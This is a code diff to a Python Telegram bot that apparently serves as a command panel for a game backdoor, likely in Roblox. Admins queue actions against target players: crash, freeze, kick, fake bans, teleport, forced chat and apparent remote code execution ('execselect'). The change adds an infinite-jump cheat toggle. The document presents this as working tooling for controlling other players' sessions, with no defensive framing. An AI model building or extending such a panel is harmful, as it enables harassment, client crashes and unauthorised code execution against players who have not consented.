@@ -21,8 +21,8 @@ SEMI_ADMINS = [int(admin_id.strip()) for admin_id in SEMI_ADMINS_STR.split(',') 
 TELEGRAM_CHAT_ID = FULL_ADMINS[0] if FULL_ADMINS else None
 
 # === УДОБНАЯ НАСТРОЙКА ПРАВ ДЛЯ SEMI_ADMINS ===
-# Доступные права: message, freeze, unfreeze, kick, defaultkick, fakeban, fakebandefault, fakeban267, reset, execselect, crash, teleport, forcechat
-SEMI_PERMS_STR = os.getenv('SEMI_PERMS', 'message,freeze,unfreeze,kick,defaultkick,fakeban,fakebandefault,fakeban267,reset,teleport,forcechat')
+# Доступные права: message, freeze, unfreeze, kick, defaultkick, fakeban, fakebandefault, fakeban267, reset, execselect, crash, teleport, forcechat, infjump
+SEMI_PERMS_STR = os.getenv('SEMI_PERMS', 'message,freeze,unfreeze,kick,defaultkick,fakeban,fakebandefault,fakeban267,reset,teleport,forcechat,infjump')
 SEMI_PERMS = [p.strip() for p in SEMI_PERMS_STR.split(',') if p.strip()]
 
 # === СПИСОК СКРЫТЫХ ИГРОКОВ (ВИДЯТ ТОЛЬКО FULL_ADMINS) ===
@@ -346,7 +346,7 @@ def telegram_webhook():
                 return jsonify({"status": "hidden_player_denied"})
             
             # --- 🛡️ УНИВЕРСАЛЬНАЯ ПРОВЕРКА ПРАВ НА ДЕЙСТВИЯ ---
-            protected_actions = ["freeze", "unfreeze", "reset", "crash", "execselect", "message", "kick", "defaultkick", "fakeban", "fakebandefault", "fakeban267", "teleport", "forcechat"]
+            protected_actions = ["freeze", "unfreeze", "reset", "crash", "execselect", "message", "kick", "defaultkick", "fakeban", "fakebandefault", "fakeban267", "teleport", "forcechat", "infjump"]
             if btn_action in protected_actions:
                 if not is_full_admin and btn_action not in SEMI_PERMS:
                     answer_callback(callback_id, "⛔ У вас нет прав на это действие!", show_alert=True)
@@ -389,6 +389,11 @@ def telegram_webhook():
                 if can_use("crash"): row3.append({"text": "💥 Crash", "callback_data": f"crash_{target_user}"})
                 if row3: keyboard_layout.append(row3)
 
+                row4 = []
+                if can_use("infjump"): row4.append({"text": "🦘 Inf Jump ON", "callback_data": f"infjumpON_{target_user}"})
+                if can_use("infjump"): row4.append({"text": "🚫 Inf Jump OFF", "callback_data": f"infjumpOFF_{target_user}"})
+                if row4: keyboard_layout.append(row4)
+
                 keyboard_layout.append([{"text": "🔙 Назад", "callback_data": "menu_players"}])
                 
                 place_id = player_places.get(target_user)
@@ -424,6 +429,13 @@ def telegram_webhook():
                 
                 alert_text = f"💥 Краш отправлен {target_user}" if btn_action == "crash" else f"✅ Команда {action} отправлена {target_user}"
                 answer_callback(callback_id, alert_text)
+
+            elif btn_action.startswith("infjump"):
+                state = "on" if "ON" in btn_action else "off"
+                action = f"/infjump_{state}"
+                if target_user not in commands_queue: commands_queue[target_user] = []
+                commands_queue[target_user].append(action)
+                answer_callback(callback_id, f"✅ Infinite Jump {state.upper()} отправлен {target_user}")
 
             elif btn_action == "execselect":
                 awaiting_execute[user_id] = target_user
